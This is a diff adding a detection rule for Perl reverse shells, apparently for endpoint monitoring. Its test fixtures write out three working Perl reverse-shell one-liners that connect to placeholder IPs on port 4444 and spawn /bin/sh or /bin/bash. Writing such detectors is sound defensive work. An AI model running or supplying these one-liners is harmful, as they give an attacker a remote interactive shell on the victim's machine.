@@ -1,0 +1,33 @@
+name: rta_perl_socket_reverse_shell
+mode: alert
+eval: |
+  (
+    e.process_name == "perl" &&
+    (
+      re_match(e.process_args, "use\\s+Socket") ||
+      re_match(e.process_args, "socket\\(") ||
+      re_match(e.process_args, "IO::Socket::INET")
+    ) &&
+    (
+      re_match(e.process_args, "SOCK_STREAM") ||
+      re_match(e.process_args, "connect\\(") ||
+      re_match(e.process_args, "PeerAddr")
+    )
+  )
+tests:
+  - cleartext: "perl Socket reverse shell"
+    process_name: perl
+    process_args: "perl -e 'use Socket;$i=\"10.10.10.10\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"
+    should_match: true
+  - cleartext: "perl IO::Socket::INET shell"
+    process_name: perl
+    process_args: "perl -MIO::Socket::INET -e '$s=new IO::Socket::INET(PeerAddr=>\"10.10.10.10\",PeerPort=>4444);STDIN->fdopen($s,r);$~->fdopen($s,w);system$_ while<>;'"
+    should_match: true
+  - cleartext: "perl one-liner with socket"
+    process_name: perl
+    process_args: "perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(4444,inet_aton(\"192.168.1.1\")));exec(\"/bin/bash -i\");'"
+    should_match: true
+  - cleartext: "normal perl script"
+    process_name: perl
+    process_args: "perl script.pl"
+    should_match: false
